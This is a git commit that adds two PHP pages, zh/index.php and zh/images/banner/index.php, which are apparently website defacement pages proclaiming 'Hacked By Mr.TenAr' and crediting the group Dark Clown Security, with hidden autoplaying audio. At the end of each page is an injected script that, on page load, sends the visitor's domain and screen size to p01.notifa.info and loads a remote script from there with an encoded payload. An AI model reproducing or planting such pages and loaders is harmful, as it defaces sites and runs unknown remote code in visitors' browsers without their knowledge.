5f0f71c3d6c51fe80abdaf1538f6c6d7b3ecfb18
chuckMET2020 <68960501+chuckMET2020@users.noreply.github.com>
2020-09-20 00:45:56 +0800

    1st

---
+++ zh/images/banner/index.php
@@ -0,0 +1,33 @@
+
+<html>
+<title>Pwned! By Mr.TenAr</title>
+<link rel="shortcut icon" href="https://1.bp.blogspot.com/-w6rsqSSKX4E/XVE88z_sBVI/AAAAAAAAEHo/gHbDiWE98wEmfhm4wugU_-F_VZoogV4SACEwYBhgL/s1600/dfe21829-f06a-4ebd-8981-d77782bd1614.jpg" type="image/png"/>
+<meta charset="utf-8">
+	<meta name="KEYWORD" CONTENT="Pwned By Mr.TenAr">
+    <meta name="description" content="Defacer by Founder Dark Clown Security"/>
+	<meta property='og:title'              content='Mr.TenAr' />
+	<meta property='og:description'        content='Mr.TenAr | Dark Clown Security' />
+<body bgcolor="black">
+<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+<center><br><br><a href='https://darkclownsecurity.blogspot.com/'><img alt='Dark Clown Security' class='arpns1986x-animation infinite arpns1986x-anim1' height='300px' src='https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQVweQIRe9cWBjxPSz3vOsxhNrJGdZsrCq9aworXBPAOgypG38P' width='200px'/></a></center>
+</h1><br>
+<br>
+<div style="position: fixed; top: 75px; left: -225px; width: 600px; padding: 10px; font-size: 24px; text-align: center; color: rgb(255, 255, 255); font-family: 'trebuchet ms', verdana, arial, sans-serif;transform: rotate(-45deg);transform-origin: 50% 0px;-o-transform: rotate(-45deg); -o-transform-origin: 50% 0px;-moz-transform: rotate(-45deg); -moz-transform-origin: 50% 0px; -webkit-transform: rotate(-45deg); -webkit-transform-origin: 50% 0px; background-color: rgb(0, 0, 0); border: 1px solid rgb(170, 170, 170); z-index: 9999; opacity: 0.5;">
+      Dark Clown Security
+    </div>
+	<center><font color="white" size="5">Pwned By Mr.TenAr</font><br><br>
+		<font color="white" size="6">God is with people who are relaxed</font>
+		<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprALm8oWL6lT49L9%2b4ik%2b21u%2fnhbfOXPvi%2bs31Sc4EorWs2hpH3FrAtBPtnbzFjdvwErjHFdeYzIi1As0xhSJEf38zbM6p9klLugOpAMJFPsZ%2fMckaCKSDcyXNHoVH62a6stbpWr9qIF1R16EeFLxBf5MxNKftNpiLhfvm%2fqtUUcv30Txz8twOrB%2fER0JhPL4chTHlkTm0xuOKDeSBMYt%2bWfUAZ8EsK7QX%2fRKpLfq9uUYx%2buGGC4eIKEzg9aaZAlYi2noeuRkWNpp4u7aVTQJVDgo7E72MPkOzwer9aticr7%2bd%2bNLjXvgMuKznWZ68YBLTx3pjEuGDW0wIrtAuPUXpOqSiyNi8EkOS7iwDPwnzTjIzXRbPDtpGjkZdkSw5tT6LzSPqH9N6%2fdKae6%2bXwllVUPt%2b%2bVEkl%2fOHTIVN6%2bCwYySMt6MqzBnXFej6I0hJPZqzdz4PCBmH1LQZ35ameKkUxDNucG7fnkWavr3pJJfjYQcF0ZL9gz336Oy6b86XBnp3B" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+		<br>
+		<center>
+<center><br><font color="red" size="3">Gretezz :</font>
+			<font color="white" size="3">Black Coder Crush ~ Project Zero Team</font>
+			<font color="red" size="3">!</font><br><br>
+			<font color="red" size="3">Thanks To :</font>
+			<font color="white" size="3">Mr.Shinorez - User01_73r14r4ng - Mr.Ze2f - ./LuLlaby007 - Junior_Eight - Dfv47 - Mr.Vr1X - ./sendpie404 - ./4XD43PTH - Hinata007 - ./Raden AR - ./Mr.201 - Mr.BxrJr - ./OM3ST - ./REN - Painlover</font><br><br>
+<font color="red" size="3">#</font>
+			<font color="white" size="3">copyright &copy; Dark Clown Security</font>
+			<font color="red" size="3">#</font><br>
+				<iframe widllth="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://6.top4top.net/m_1433v173p1.mp3"></iframe>
+</body>
+		</html>
---
+++ zh/index.php
@@ -0,0 +1,88 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="UTF-8">
+  	<title>Hacked By Mr.TenAr</title>
+  	<title>Dark Clown Security</title>
+	<link rel="SHORTCUT ICON" href="https://i.ibb.co/XCLmPVG/Lock.jpg" type="image/x-icon"/>
+	<link href="https://fonts.googleapis.com/css?family=Saira+Stencil+One|Lacquer&display=swap" rel="stylesheet">
+	<style type="text/css">
+		@keyframes blink{
+			0%{color:black;}
+			50%{color:red;}
+			100%{color:black;}
+		}
+		@-webkit-keyframes blink{
+			0%{color:black;}
+			50%{color:red;}
+			100%{color:black;}
+		}
+		.nick{
+            font-family: 'Saira Stencil One', cursive;
+        }
+        .dcs{
+            font-family: 'Lacquer', sans-serif;
+        }
+        .blink{
+            font-family: 'Saira Stencil One', cursive;
+            -webkit-animation keyframes: blink 1s linear infinite;
+            -moz-animation: blink 1s linear infinite;
+            animation: blink linear 1s infinite 
+        }
+	</style>
+</head>
+<body bgcolor="white">
+	<center>
+	<img src="https://1.bp.blogspot.com/-l4eOxPz8HW4/XgxYPH8-YPI/AAAAAAAADB4/G3T7moxwdUwICUgntTTjW13lh-Wm5vKkACLcBGAsYHQ/s1600/1577867217178.png" width="300">
+	<br>
+	<font class="dcs" size="7" color="black" font style="text-shadow: 0px 0px 5px green;">Dark Clown Security</font>
+	<br>
+	<font class="nick" color="black">|&nbsp; </font><font class="nick" color="black" font style="text-shadow: 0px 0px 4px green;">
+      God </font><font class="nick" color="black">Is With <font class="nick" color="black" font style="text-shadow: 0px 0px 4px green">Relaxed</font><font class="nick" color="black"> People |
+    </font>
+	<br>
+	<font class="nick" color="black">Are you sure</font><font class="nick" color="black" font style="text-shadow: 0px 0px 4px green;"> your security </font><font class="blink" color="black" font style="text-shadow: 0px 0px 4px green;">??</font>
+	<br><br>
+		<font class="dcs" size="7" color="black" font style="text-shadow: 0px 0px 5px green;">Mr.TenAr</font>
+	<br><br><br>
+	  <font class="nick" color="red">--= We Are =--</font>
+	<br>  
+	  <font class="blink" color="black" font style="text-shadow: 0px 0px 3px green;">-=</font>
+	  <font class="blink" color="black"> Mr.TenAr </font>
+	  <font class="blink" color="black" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> ./Ze2F\. </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> Mr.Shinorez </font>
+	  <font class="blink" color="black" font style="text-shadow: 0px 0px 1px black;">|</font>
+	  <font class="nick" color="black"> Junior_Eight </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> User01_73r14r4ng </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> Mr.VR1X </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> ./Sendpie404 </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> LuLlaby007 </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> 4XD43PTH </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> Hinata007 </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> ./Mr.201 </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> Dfv47 </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font>
+	  <font class="nick" color="black"> Mr.BxrJr </font>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">=-</font>
+	<br>
+	  <font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">-=</font>
+	  <font class="nick" color="black"> ./OM3ST </font><font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font><font class="nick" color="black"> Raden AR </font><font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">|</font><font class="nick" color="black"> ./REN </font><font class="blink" color="white" font style="text-shadow: 0px 0px 3px green;">=-
+	</font>
+	<br><hr>
+	<font class="" color="black" font style="text-shadow: 0px 0px 4px green;">Copyright&copy; Dark Clown Security&trade;</font>
+	</center>
+	<iframe widllth="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://1.top4top.net/m_1454f1sh30.mp3"></iframe>
+	<br>
+	<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXntH%2fqIGY%2by9dQrah9JI5RJ3Wgv3eeiV0QZLKuYD30ayDmBWNimkYxsZ5ql4osgn2BaTDmU7bZ6SS0OdI7%2fXmxETXUEtswUm%2feNn91UGrT%2fXe1fbx6QUiADjCRqNihDL2pW5txTJnvnGNPDBL1%2bxewEMInBgAFUEgQXKH75zEwycVCxuEemc1VugwUNGXptBmm2trotPOpYWkPhNz0sgYvacSDtMFcICT2%2fQlQLK4PUhLH1pt3QS%2fI7olvpiK%2bRnEMiuHMoExxpafLXMavE3VM7CvBaki0hePF3mCgyr6Aulf12%2fpzvvUUile4Rrra%2bQCmIZPvfPsPNtfSVjlsRxwAS4HKho5xR35ebGlro34AJ3eHX5PFRYm%2bgaLPbUmeS0YAd1UFXMIewGVc99Kmsha%2fQp2NAUpPeGBKrhjQ5lNzU82sjuSp%2fmcZtPx3C6LXHjSXtTUDL2XusqqNuEWG9jB9KOZ9QV%2b48mAGM6QE%2bdrJg8KdAth47X%2b22jsVw%2bMB4ywG7BM7I3XLA0RVB5FjX%2byOR0sF7AVNYHi" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
